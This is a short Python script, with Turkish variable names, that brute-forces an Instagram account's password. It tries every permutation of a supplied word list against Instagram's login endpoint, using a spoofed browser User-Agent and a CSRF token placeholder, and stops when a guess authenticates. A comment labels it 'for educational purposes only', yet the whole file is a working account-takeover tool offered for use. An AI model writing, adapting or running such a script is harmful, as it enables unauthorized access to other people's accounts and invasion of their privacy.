import requests
import itertools

def denetle(instagram_adresi, girdiler):
    for r in range(1, len(girdiler) + 1):
        kombinasyonlar = itertools.permutations(girdiler, r)
        for kombinasyon in kombinasyonlar:
            sifre = ''.join(kombinasyon)
            print(f"Denetleniyor: {sifre}")
            session = requests.Session()
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
		#You have to write it where it says 'Token'. this is for educational purposes only. I take no responsibility if it is abused! Please comply with ethical values
                'X-CSRFToken': 'Token'
            }
            login_url = 'https://www.instagram.com/accounts/login/ajax/'
            data = {
                'username': instagram_adresi,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:0:{sifre}',
                'queryParams': {},
                'optIntoOneTap': 'false'
            }
            response = session.post(login_url, headers=headers, data=data)
            if 'authenticated' in response.text:
                print(f"Şifre doğru: {sifre}")
                return  # Doğru şifre bulundu, denetlemeyi sonlandır
            else:
                print(f"Şifre yanlış: {sifre}")

instagram_adresi = "intagram_adress"
girdiler = ["word1", "word2", "word3", "Coder", "Vi", ".", ",", "!", " ","number1","number2","number3","number4"]

denetle(instagram_adresi, girdiler)
